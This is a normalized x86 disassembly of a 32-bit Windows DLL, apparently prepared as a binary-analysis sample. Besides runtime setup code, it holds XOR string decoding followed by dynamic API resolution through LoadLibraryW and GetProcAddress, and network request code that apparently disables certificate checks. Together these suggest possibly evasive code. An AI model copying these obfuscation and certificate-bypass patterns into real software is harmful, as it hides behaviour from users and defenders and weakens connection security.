mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_100579de
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1001d94e
push 0x30
mov eax sub_1008611d
call sub_10047689
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x34 ] ecx
jb r-xdata
xor ebx ebx
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] bl
jne r-xdata
mov eax [ eax ]
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1003e780
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x3c ] esp
push eax
call sub_1000aed0
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10060f92
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax edi
call sub_100262c3
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
sub_1001da10
push ebp
mov ebp esp
push 0xffffffff
push sub_100880a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xc0 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xd0 ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0x98 ] cx
push edx
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x84 ] 0x7
mov [ ebp - 0x88 ] eax
call sub_1002d970
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xec ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xb4 ]
call sub_10068a40
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x1
call sub_1006da10
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xa0 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x84 ] 0x8
mov eax [ ebp - 0x98 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x9
call sub_10071e30
lea edx [ ebp - 0x7c ]
mov eax 0x4f
call sub_10071e30
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x7c ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xc8 ] edi
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebx + 0xb0 ]
mov edx [ ebp - 0xbc ]
neg ecx
sbb ecx ecx
and ecx 0x800000
push ecx
mov ecx [ ebx + 0xe0 ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0xbc ]
push edx
push eax
call ecx
mov esi eax
mov [ ebp - 0xbc ] esi
test esi esi
jne r-xdata
lea eax [ ebp - 0x98 ]
mov eax [ ebx + 0xc8 ]
push 0x4
lea edx [ ebp - 0xd4 ]
push edx
push 0x3f
mov edi 0x2
push esi
mov [ ebp - 0xd4 ] edi
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x1
jmp r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xb8 ] edi
jmp r-xdata
mov esi [ ebp - 0xc0 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x6c ]
lea ecx [ ebx + 0x5c ]
push r--data
xor edi edi
call sub_100449d0
test eax eax
je r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov ecx [ ebx + 0xd4 ]
push esi
call ecx
cmp [ ebp - 0xb8 ] 0x0
je r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0xd0 ]
mov [ esi ] 0x0
mov [ edx ] 0x0
mov eax [ ebp - 0xc8 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ebp - 0xc4 ]
push 0x0
push eax
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0xffffffff
push edx
push esi
call eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x88 ]
lea ecx [ ebx + 0x78 ]
push r--data
call sub_100449d0
test eax eax
je r-xdata
mov edx [ ebx + 0xc8 ]
push 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push 0x1f
push esi
mov [ ebp - 0xe0 ] 0x3100
call edx
mov eax [ ebp - 0xb8 ]
mov eax [ ebp - 0x98 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebx + 0xe8 ]
push 0x0
push esi
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x4
jmp r-xdata
lea edi [ ebx + 0x94 ]
mov ecx edi
call sub_10012450
test al al
je r-xdata
mov edi [ ebp - 0xd8 ]
mov eax [ ebx + 0xd8 ]
push 0x0
lea edx [ ebp - 0xdc ]
push edx
push edi
push 0x0
push 0x20000013
push esi
mov [ ebp - 0xdc ] 0x4
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x5
jmp r-xdata
mov ecx 0x8
cmp [ edi + 0x14 ] ecx
jb r-xdata
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xb8 ] 0x6
jmp r-xdata
cmp [ ebx + 0x8c ] ecx
lea eax [ ebx + 0x78 ]
jb r-xdata
mov edi [ edi ]
mov edi [ ebp - 0xc0 ]
push esi
mov esi [ ebp - 0xd0 ]
call sub_10005ba0
mov esi [ ebp - 0xbc ]
mov [ ebp - 0xb8 ] eax
push 0x0
push edi
push eax
mov eax [ ebx + 0xcc ]
push 0x1
push 0x1
push esi
call eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0xb8 ] 0x3
jmp r-xdata
sub_1001ddd0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
dec eax
mov [ ecx + 0x4 ] eax
mov ecx [ ecx ]
mov eax [ ecx + eax * 4 ]
pop ebp
retn
pop ebp
retn
sub_1001ddf0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push r--data
push ecx
mov edx 0xa
mov [ ebp - 0x1c ] 0x0
call sub_100727f0
add esp 0xc
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x18 ]
mov [ esi ] dx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
call sub_10034100
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001de6b
push 0x28
mov eax sub_1008547e
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
push ecx
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_100668f6
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1001df00
push ebp
mov ebp esp
push 0xffffffff
push sub_1008641c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x38 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call sub_10060250
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebp - 0x4 ] 0x2
push eax
mov ecx esi
mov [ esi ] r--data
call sub_1000ac90
jmp r-xdata
sub_1001dfc1
push 0xc
push r--data
call sub_1007fad0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10032da8
push ebx
push esi
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10024678
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1007ec40
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10024678
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1000321c
pop ecx
pop ecx
push eax
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1007fb15
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1000321c
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001e140
push ebp
mov ebp esp
push 0xffffffff
push sub_10088311
mov eax [ fs : 0x0 ]
push eax
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ebx ecx
lea ecx [ ebp - 0xd4 ]
push edi
push ecx
mov esi edx
mov [ ebp - 0xd8 ] eax
call sub_100609f0
mov edx esi
push eax
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x0
call sub_100519f0
push eax
mov edx r--data
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_100519f0
push eax
mov edx r--data
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_100519f0
mov edx [ ebp - 0xd8 ]
push eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_100519f0
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x5
call sub_100519f0
add esp 0x24
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_10033f90
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ebx ebx
xor eax eax
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] esi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
inc [ edi + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xd4 ]
push edx
call sub_1000a86e
add esp 0x4
sub_1001e32d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1001e3ae
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042442
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004c7b
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004c7b
add esp 0x14
sub_1001e438
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1003a496
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_1001e4a0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x38
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x24 ]
push edx
mov ecx esi
call sub_10034100
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_100449d0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001e5a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100874c9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
cmp ecx eax
je r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
mov [ ebp - 0x14 ] 0x1
cmp esi [ edi + 0x4 ]
je r-xdata
push eax
call sub_1005be20
add esp 0x4
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
add [ ebp - 0x10 ] 0x1c
add esi 0x1c
cmp esi [ edi + 0x4 ]
jne r-xdata
push 0x1
push r--data
mov ecx ebx
call sub_10012830
push 0xffffffff
push 0x0
push esi
mov ecx ebx
call sub_10004e10
mov ecx [ ebp - 0x10 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
sub_1001e650
push ebp
mov ebp esp
push 0xffffffff
push sub_10086858
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_1003e780
cmp ebx edi
je r-xdata
push edi
push edi
push edi
push edi
push ebx
push eax
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
inc eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push 0x0
push 0x0
mov edi eax
mov eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_1003e780
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_1003acf0
lea ecx [ ebp - 0x2c ]
call sub_10003250
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
mov ecx esi
call sub_10004c10
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001e790
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
mov eax 0x6
call sub_1006dec0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001e850
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
